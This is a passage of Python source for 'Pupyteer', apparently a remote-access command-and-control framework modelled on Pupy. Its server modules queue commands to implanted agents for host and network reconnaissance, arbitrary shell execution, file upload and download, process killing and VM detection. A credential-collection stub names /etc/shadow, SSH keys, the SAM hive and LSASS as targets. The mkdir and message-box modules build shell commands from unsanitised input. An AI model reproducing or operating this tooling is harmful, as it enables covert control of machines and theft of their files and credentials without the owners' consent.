"""Built-in Pupyteer modules — Recon, Execution, File Operations, Red-Team.

These modules dispatch commands to agents through the session manager's
command queue, and wait for the answer. The queue-and-wait loop, and the chunked
file transfer built on it, live in ``server.sessions.transfer`` — the same code
the operator console runs, so a module cannot report a transfer the console would
have discovered was incomplete.
"""
from __future__ import annotations

import json
import os
from typing import Any, Dict

from pupyteer.server.modules.registry import PupyModule, ModuleCategory, ModuleRequirement
from pupyteer.server.sessions import transfer


# Default timeout for waiting for agent command results
DEFAULT_COMMAND_TIMEOUT = transfer.DEFAULT_TIMEOUT


# How long a module will wait for one agent answer when the caller says nothing.
# An agent between beacons is normal, so this has to outlast the beacon interval.
def _command_timeout(args: Dict[str, Any]) -> float:
    try:
        value = float(args.get("timeout", DEFAULT_COMMAND_TIMEOUT))
    except (TypeError, ValueError):
        return DEFAULT_COMMAND_TIMEOUT
    return value if value > 0 else DEFAULT_COMMAND_TIMEOUT


def _no_agent(session: Any) -> Dict[str, Any]:
    """What a module says when it was never given a way to reach the agent.

    A module that cannot dispatch has not done the thing it is named after, so it
    fails. Returning a well-shaped empty result instead is how an operator ends up
    believing a file was uploaded.
    """
    return {
        "status": "error",
        "error": "no session manager: nothing was sent to the agent",
        "session_id": getattr(session, "session_id", ""),
    }


async def _dispatch_command(session: Any, session_mgr: Any, command: str, timeout: float = DEFAULT_COMMAND_TIMEOUT) -> Dict[str, Any]:
    """
    Send a command to an agent via session manager and wait for the result.

    Returns a dict with 'status', 'output', and 'command_id' keys.
    """
    if not session_mgr:
        return {"status": "error", "error": "No session manager available"}

    answered = await transfer.run_command(
        session_mgr, session.session_id, command, timeout=timeout)
    if answered.get("error"):
        return {"status": "error", "error": answered["error"]}
    if answered["output"] is None:
        return {
            "status": "error",
            "error": f"Command timed out after {timeout}s "
                     f"(is the agent beaconing?)",
            "command_id": answered["command_id"],
        }
    return {
        "status": "ok",
        "output": answered["output"],
        "command_id": answered["command_id"],
    }


# ── Recon ──────────────────────────────────────────────────────────────


class SystemInfoModule(PupyModule):
    """Gather system information from target."""

    name = "sysinfo"
    version = "1.0.0"
    description = "Collect system information (OS, hostname, architecture, user)"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON
    requirements: list[ModuleRequirement] = []
    compatible_systems: list[str] = []  # all platforms

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        # Get session manager from session info or module context
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            # Fallback: use static info from session metadata
            return {
                "status": "ok",
                "source": "metadata",
                "data": {
                    "hostname": getattr(session, "hostname", "unknown"),
                    "os": getattr(session, "os", "unknown"),
                    "arch": getattr(session, "arch", "unknown"),
                    "username": getattr(session, "username", "unknown"),
                    "remote_address": getattr(session, "remote_address", ""),
                    "connected_at": getattr(session, "connected_at", 0),
                    "last_checkin": getattr(session, "last_checkin", 0),
                },
            }

        # Determine OS and request appropriate info commands
        os_name = getattr(session, "os", "").lower()
        if "win" in os_name:
            info_cmd = "systeminfo"
        else:
            info_cmd = "uname -a && id && hostname"

        result = await _dispatch_command(session, session_mgr, info_cmd)
        return {
            "status": result.get("status", "ok"),
            "source": "agent",
            "data": {
                "hostname": getattr(session, "hostname", "unknown"),
                "os": getattr(session, "os", "unknown"),
                "arch": getattr(session, "arch", "unknown"),
                "username": getattr(session, "username", "unknown"),
                "command_output": result.get("output", ""),
            },
            "error": result.get("error"),
        }


class ProcessListModule(PupyModule):
    """List running processes on target."""

    name = "ps"
    version = "1.0.0"
    description = "Enumerate running processes"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON
    compatible_systems: list[str] = []

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return {"status": "error", "error": "No session manager available"}

        os_name = getattr(session, "os", "").lower()
        if "win" in os_name:
            cmd = "tasklist"
        else:
            cmd = "ps aux"

        result = await _dispatch_command(session, session_mgr, cmd)
        return {
            "status": result.get("status", "ok"),
            "processes_raw": result.get("output", ""),
            "error": result.get("error"),
        }


class NetworkInfoModule(PupyModule):
    """Gather network information from target."""

    name = "netinfo"
    version = "1.0.0"
    description = "Collect network interfaces, routes, and connections"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return {"status": "error", "error": "No session manager available"}

        os_name = getattr(session, "os", "").lower()
        if "win" in os_name:
            cmd = "ipconfig /all && netstat -an"
        else:
            cmd = "ip addr && ip route && ss -tunlp 2>/dev/null || netstat -tunlp"

        result = await _dispatch_command(session, session_mgr, cmd)
        return {
            "status": result.get("status", "ok"),
            "network_raw": result.get("output", ""),
            "error": result.get("error"),
        }


# ── Execution ──────────────────────────────────────────────────────────


class ShellExecModule(PupyModule):
    """Execute commands on target."""

    name = "exec"
    version = "1.0.0"
    description = "Execute shell commands on target session"
    author = "Pupyteer Team"
    category = ModuleCategory.EXECUTION

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        command = args.get("command", "")
        if not command:
            return {"status": "error", "error": "No command specified"}

        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return _no_agent(session)

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, command, timeout=timeout)

        return {
            "status": result.get("status", "ok"),
            "command": command,
            "output": result.get("output", ""),
            "command_id": result.get("command_id"),
            "error": result.get("error"),
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        errors: list[str] = []
        if not args.get("command"):
            errors.append("Missing required argument: command")
        return errors


# ── File Operations ───────────────────────────────────────────────────


class UploadModule(PupyModule):
    """Upload a file to the target."""

    name = "upload"
    version = "1.0.0"
    description = "Upload a file from operator to target session"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        local_path = args.get("local_path", "")
        remote_path = args.get("remote_path", "")
        if not local_path or not remote_path:
            return {
                "status": "error",
                "error": "Both local_path and remote_path are required",
            }
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return _no_agent(session)

        outcome = await transfer.push(
            session_mgr, session.session_id, local_path, remote_path,
            timeout=_command_timeout(args))
        if outcome["status"] != "ok":
            return {
                "status": "error",
                "error": outcome["error"],
                "local_path": local_path,
                "remote_path": remote_path,
                "bytes_transferred": outcome.get("bytes", 0),
            }
        return {
            "status": "ok",
            "local_path": local_path,
            "remote_path": remote_path,
            "bytes_transferred": outcome["bytes"],
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        errors: list[str] = []
        if not args.get("local_path"):
            errors.append("Missing required argument: local_path")
        if not args.get("remote_path"):
            errors.append("Missing required argument: remote_path")
        return errors


class DownloadModule(PupyModule):
    """Download a file from the target."""

    name = "download"
    version = "1.0.0"
    description = "Download a file from target session to operator"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        remote_path = args.get("remote_path", "")
        if not remote_path:
            return {"status": "error", "error": "remote_path is required"}
        local_path = args.get("local_path") or os.path.basename(
            remote_path.replace("\\", "/").rstrip("/")) or "downloaded_file"
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return _no_agent(session)

        parent = os.path.dirname(os.path.abspath(local_path))
        os.makedirs(parent, exist_ok=True)
        # Chunked straight to disk, so a target-side file larger than the
        # operator's memory costs a file handle rather than a second copy of it.
        with open(local_path, "wb") as sink:
            outcome = await transfer.pull(
                session_mgr, session.session_id, remote_path, sink,
                timeout=_command_timeout(args))
        if outcome["status"] != "ok":
            return {
                "status": "error",
                "error": outcome["error"],
                "remote_path": remote_path,
                "local_path": local_path,
                "bytes_transferred": outcome.get("bytes", 0),
            }
        return {
            "status": "ok",
            "remote_path": remote_path,
            "local_path": local_path,
            "bytes_transferred": outcome["bytes"],
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        errors: list[str] = []
        if not args.get("remote_path"):
            errors.append("Missing required argument: remote_path")
        return errors


class FileListModule(PupyModule):
    """List files on the target."""

    name = "file_list"
    version = "1.0.0"
    description = "List files and directories on target session"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        path = args.get("path", ".")
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "fs_list", "path": path},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"], "path": path}
        entries = reply.get("entries")
        if not isinstance(entries, list):
            return {
                "status": "error",
                "error": f"agent sent no listing for {path}: {str(reply)[:200]}",
                "path": path,
            }
        return {"status": "ok", "path": reply.get("path", path), "entries": entries}

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        return []


# ── Red-Team ──────────────────────────────────────────────────────────


class DiscoveryModule(PupyModule):
    """Run discovery commands on the target."""

    name = "discovery"
    version = "1.0.0"
    description = "Run host/network discovery commands (whoami, ipconfig, etc.)"
    author = "Pupyteer Team"
    category = ModuleCategory.RED_TEAM

    DISCOVERY_CMDS = {
        "whoami": "whoami",
        "hostname": "hostname",
        "ipconfig": "ipconfig /all",
        "ifconfig": "ip addr",
        "netstat": "netstat -an",
    }

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        target = args.get("target", "whoami")
        command = self.DISCOVERY_CMDS.get(target, target)
        session_mgr = getattr(self, '_session_manager', None)
        if not session_mgr:
            return _no_agent(session)

        # Sent as a JSON task rather than typed text: "hostname" as a bare line is
        # the agent's own module action, and an operator asking for the shell
        # command would get the module's answer instead.
        result = await _dispatch_command(
            session, session_mgr, json.dumps({"action": "exec", "command": command,
                                              "timeout": int(_command_timeout(args))}),
            timeout=_command_timeout(args))
        return {
            "status": result.get("status", "ok"),
            "target": target,
            "command": command,
            "output": result.get("output", ""),
            "command_id": result.get("command_id"),
            "error": result.get("error"),
        }


class CredentialCollectionModule(PupyModule):
    """Collect credentials from common locations (lab/simulation only)."""

    name = "credential_collect"
    version = "1.0.0"
    description = "Collect credentials from common target locations (simulation)"
    author = "Pupyteer Team"
    category = ModuleCategory.RED_TEAM

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        # Simulation-only — returns what would be targeted
        return {
            "status": "ok",
            "simulation": True,
            "targets": [
                "~/.ssh/",
                "/etc/shadow",
                "SAM hive",
                "LSASS (simulated)",
            ],
            "credentials": [],
        }


class LateralMovementSimModule(PupyModule):
    """Simulate lateral movement paths (lab-only)."""

    name = "lateral_sim"
    version = "1.0.0"
    description = "Simulate lateral movement paths for assessment (lab mode)"
    author = "Pupyteer Team"
    category = ModuleCategory.RED_TEAM

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        technique = args.get("technique", "smb")
        return {
            "status": "ok",
            "simulation": True,
            "technique": technique,
            "paths": [],
        }


class AssessmentUtilityModule(PupyModule):
    """Run security assessment checks on the target."""

    name = "assess"
    version = "1.0.0"
    description = "Run security assessment checks (firewall, AV, patches)"
    author = "Pupyteer Team"
    category = ModuleCategory.RED_TEAM

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        check = args.get("check", "all")
        return {
            "status": "ok",
            "check": check,
            "findings": [],
        }


class NetstatModule(PupyModule):
    """List network connections on the target.

    Upstream Pupy's ``netstat``. The implant answers in whichever shape its host
    allowed — parsed connections, or the raw text of the host's own netstat — so
    both are surfaced rather than forcing one shape and inventing the other.
    """

    name = "netstat"
    version = "1.0.0"
    description = "List network connections on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "netstat"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        output = reply.get("output")
        connections = reply.get("connections")
        if not output and connections is None:
            return {
                "status": "error",
                "error": f"agent returned no connection listing: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "source": reply.get("source")}
        if connections is not None:
            result["connections"] = connections
            result["count"] = reply.get("count", len(connections))
        if output:
            result["output"] = output
        return result


class ProcessKillModule(PupyModule):
    """Terminate a process on the target, by pid or by name.

    Upstream Pupy's ``process_kill``. Destructive, so it reports success only on
    the agent's explicit confirmation that the process is gone; a reply that is
    merely well-formed is an error, because an operator who believes a process
    is dead and is wrong draws the wrong conclusion about the host.
    """

    name = "process_kill"
    version = "1.0.0"
    description = "Terminate a process on the target (pid or name)"
    author = "Pupyteer Team"
    category = ModuleCategory.EXECUTION

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        pid = args.get("pid")
        name = str(args.get("name", "")).strip()
        if not pid and not name:
            return {"status": "error", "error": "a pid or a name is required"}

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        task: Dict[str, Any] = {"action": "process_kill"}
        if pid:
            try:
                task["pid"] = int(pid)
            except (TypeError, ValueError):
                return {"status": "error", "error": f"pid must be a number, got {pid!r}"}
        if name:
            task["name"] = name

        reply = await transfer.run_action(
            session_mgr, session.session_id, task, timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}
        if not reply.get("killed"):
            return {
                "status": "error",
                "error": f"the agent did not confirm the kill: {str(reply)[:200]}",
            }
        return {"status": "ok", "pid": reply.get("pid"), "killed": True}

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not args.get("pid") and not str(args.get("name", "")).strip():
            return ["Missing required argument: pid or name"]
        return []


class PwdModule(PupyModule):
    """Report the agent's working directory.

    Upstream Pupy's ``pwd``. Exists because relative paths in every other
    result are unanchored without it.
    """

    name = "pwd"
    version = "1.0.0"
    description = "Report the agent's working directory"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "pwd"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}
        cwd = reply.get("cwd")
        if not cwd:
            return {
                "status": "error",
                "error": f"the agent did not report a working directory: {str(reply)[:200]}",
            }
        return {"status": "ok", "cwd": cwd, "platform": reply.get("platform")}


class HwUuidModule(PupyModule):
    """Report the target's hardware or installation identifier.

    Upstream Pupy's ``get_hwuuid``. Classified PY_DEP in the manifest but not
    actually blocked -- the lookup is pure stdlib, so it does not wait on the
    package-loading mechanism.
    """

    name = "get_hwuuid"
    version = "1.0.0"
    description = "Report the target's hardware/installation identifier"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "get_hwuuid"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        hwuuid = reply.get("hwuuid")
        if not hwuuid:
            return {
                "status": "error",
                "error": f"the agent reported no hardware identifier: {str(reply)[:200]}",
            }
        return {"status": "ok", "hwuuid": hwuuid, "source": reply.get("source")}


class EnvModule(PupyModule):
    """Report the agent's environment variables.

    Upstream Pupy's ``env``. The agent withholds values whose name looks like a
    credential and names the keys it withheld, so this surfaces both rather than
    presenting a partial environment as a complete one.
    """

    name = "env"
    version = "1.0.0"
    description = "Report the agent's environment variables (credentials redacted)"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "env"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        variables = reply.get("variables")
        if not isinstance(variables, dict):
            return {
                "status": "error",
                "error": f"the agent reported no environment variables: {str(reply)[:200]}",
            }
        return {
            "status": "ok",
            "variables": variables,
            "redacted": reply.get("redacted", []),
            "count": len(variables),
        }


class DateModule(PupyModule):
    """Read the target host's clock (UTC and local).

    Upstream Pupy's ``date``. Classified PY_DEP in the manifest, which was
    wrong: the upstream source has no third-party imports.
    """

    name = "date"
    version = "1.0.0"
    description = "Read the target host's clock (UTC and local)"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "date"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        value = reply.get("utc")
        if not value:
            return {
                "status": "error",
                "error": f"the agent returned no answer for date: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "utc": value}
        for extra in ("count", "local", "tzname", "id"):
            if extra in reply:
                result[extra] = reply[extra]
        return result


class AliveModule(PupyModule):
    """Liveness check distinct from ping.

    Upstream Pupy's ``alive``. Classified PY_DEP in the manifest, which was
    wrong: the upstream source has no third-party imports.
    """

    name = "alive"
    version = "1.0.0"
    description = "Liveness check distinct from ping"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "alive"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        value = reply.get("alive")
        if not value:
            return {
                "status": "error",
                "error": f"the agent returned no answer for alive: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "alive": value}
        for extra in ("count", "local", "tzname", "id"):
            if extra in reply:
                result[extra] = reply[extra]
        return result


class GetpidModule(PupyModule):
    """Report the agent process's own pid.

    Upstream Pupy's ``getpid``. Stdlib-only upstream, so covered by the
    native-reimplementation strategy rather than a dependency.
    """

    name = "getpid"
    version = "1.0.0"
    description = "Report the agent process's own pid"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "getpid"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        value = reply.get("pid")
        # pid/ppid 0 is "no answer", not a valid one.
        if value is None or value == "" or (isinstance(value, int) and value == 0):
            return {
                "status": "error",
                "error": f"the agent returned no answer for getpid: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "pid": value}
        for extra in ("uid", "gid"):
            if extra in reply:
                result[extra] = reply[extra]
        return result


class GetuidModule(PupyModule):
    """Report the identity the agent runs as.

    Upstream Pupy's ``getuid``. Stdlib-only upstream, so covered by the
    native-reimplementation strategy rather than a dependency.
    """

    name = "getuid"
    version = "1.0.0"
    description = "Report the identity the agent runs as"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "getuid"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        value = reply.get("user")
        # pid/ppid 0 is "no answer", not a valid one.
        if value is None or value == "" or (isinstance(value, int) and value == 0):
            return {
                "status": "error",
                "error": f"the agent returned no answer for getuid: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "user": value}
        for extra in ("uid", "gid"):
            if extra in reply:
                result[extra] = reply[extra]
        return result


class GetppidModule(PupyModule):
    """Report the agent's parent pid.

    Upstream Pupy's ``getppid``. Stdlib-only upstream, so covered by the
    native-reimplementation strategy rather than a dependency.
    """

    name = "getppid"
    version = "1.0.0"
    description = "Report the agent's parent pid"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "getppid"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        value = reply.get("ppid")
        # pid/ppid 0 is "no answer", not a valid one.
        if value is None or value == "" or (isinstance(value, int) and value == 0):
            return {
                "status": "error",
                "error": f"the agent returned no answer for getppid: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "ppid": value}
        for extra in ("uid", "gid"):
            if extra in reply:
                result[extra] = reply[extra]
        return result


class GetdomainModule(PupyModule):
    """Report the DNS/AD domain the host belongs to.

    Upstream Pupy's ``getdomain``. Stdlib-only upstream, so covered by the
    native-reimplementation strategy rather than a dependency.
    """

    name = "getdomain"
    version = "1.0.0"
    description = "Report the DNS/AD domain the host belongs to"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "getdomain"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        value = reply.get("domain")
        # Presence, not truthiness: domain may legitimately be an empty string
        # (workgroup) or False (not a VM), and both are real answers.
        if value is None or value == "":
            return {
                "status": "error",
                "error": f"the agent returned no answer for getdomain: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "domain": value}
        for extra in ("indicators", "joined"):
            if extra in reply:
                result[extra] = reply[extra]
        return result


class CheckVmModule(PupyModule):
    """Report whether the host looks virtualised.

    Upstream Pupy's ``check_vm``. Stdlib-only upstream, so covered by the
    native-reimplementation strategy rather than a dependency.
    """

    name = "check_vm"
    version = "1.0.0"
    description = "Report whether the host looks virtualised"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        reply = await transfer.run_action(
            session_mgr, session.session_id, {"action": "check_vm"},
            timeout=_command_timeout(args))
        if reply.get("error"):
            return {"status": "error", "error": reply["error"]}

        value = reply.get("is_vm")
        # Presence, not truthiness: is_vm may legitimately be an empty string
        # (workgroup) or False (not a VM), and both are real answers.
        if value is None:
            return {
                "status": "error",
                "error": f"the agent returned no answer for check_vm: {str(reply)[:200]}",
            }
        result: Dict[str, Any] = {"status": "ok", "is_vm": value}
        for extra in ("indicators", "joined"):
            if extra in reply:
                result[extra] = reply[extra]
        return result


# ── Shell-dispatched recon primitives ────────────────────────────────
#
# These upstream Pupy modules (users, drives, getprivs, ...) were built on
# Pupy's agent-side remote-module injection (pupyps, pupwinutils, ...). Rather
# than ship that package tree, Pupyteer reimplements them as native shell
# dispatchers: the implant already answers arbitrary commands through the
# session manager's command queue, so each module just queues the host's own
# tool and surfaces its output. Same shape as ShellExecModule; no agent change.


class UsersModule(PupyModule):
    """List interactive user accounts on the target.

    Upstream Pupy's ``users`` (via pupyutils.users). Native reimplementation
    using the host's own account database.
    """

    name = "users"
    version = "1.0.0"
    description = "List user accounts on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "net user"
        elif "darwin" in os_name or "mac" in os_name:
            cmd = "dscl . list /Users"
        else:
            cmd = "getent passwd | cut -d: -f1"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class DrivesModule(PupyModule):
    """List mounted drives / filesystems on the target.

    Upstream Pupy's ``drives`` (via psutil / pupyps). Native reimplementation
    using the host's own tools.
    """

    name = "drives"
    version = "1.0.0"
    description = "List mounted drives and filesystems on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "wmic logicaldisk get name,description,freespace,size"
        else:
            cmd = "df -h"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class GetprivsModule(PupyModule):
    """Show the current process privileges on the target.

    Upstream Pupy's ``getprivs`` (via pupwinutils.security). Native
    reimplementation using the host's own tooling.
    """

    name = "getprivs"
    version = "1.0.0"
    description = "Show current process privileges on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "whoami /priv"
        else:
            cmd = "id"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class MkdirModule(PupyModule):
    """Create a directory on the target.

    Upstream Pupy's ``mkdir`` (via pupyutils.basic_cmds). Native
    reimplementation using the host's own mkdir.
    """

    name = "mkdir"
    version = "1.0.0"
    description = "Create a directory on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.FILE_OPS

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        path = str(args.get("path") or args.get("dir") or "").strip()
        if not path:
            return {"status": "error", "error": "path argument is required"}

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = f'mkdir "{path}" 2>nul || echo directory exists'
        else:
            cmd = f'mkdir -p "{path}" && echo "created: {path}"'

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "path": path}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "path": path,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not (args.get("path") or args.get("dir")):
            return ["Missing required argument: path"]
        return []


class WModule(PupyModule):
    """List logged-in terminal sessions on the target.

    Upstream Pupy's ``w`` (via pupyps / pupwinutils.security). Native
    reimplementation using the host's own tooling.
    """

    name = "w"
    version = "1.0.0"
    description = "List logged-in terminal sessions on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "query user"
        else:
            cmd = "w -h"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class MsgboxModule(PupyModule):
    """Pop a message box / notification on the target.

    Upstream Pupy's ``msgbox`` (via pupwinutils.msgbox / notify / osascript).
    Native reimplementation using the host's own notification mechanism.
    """

    name = "msgbox"
    version = "1.0.0"
    description = "Pop a message box or notification on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.EXECUTION

    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
        text = str(args.get("text") or args.get("message") or "").strip()
        title = str(args.get("title") or "Pupyteer").strip()
        if not text:
            return {"status": "error", "error": "text argument is required"}

        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = (
                f'powershell -Command "Add-Type -AssemblyName '
                f'Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox('
                f"\\'{text}\\', 0, \\'{title}\\')" + '"'
            )
        elif "darwin" in os_name or "mac" in os_name:
            cmd = f'osascript -e \'display notification "{text}" with title "{title}"\''
        else:
            cmd = f'notify-send "{title}" "{text}" 2>/dev/null || echo "{text}"'

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd, "text": text}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "text": text,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }

    def validate_args(self, args: Dict[str, Any]) -> list[str]:
        if not (args.get("text") or args.get("message")):
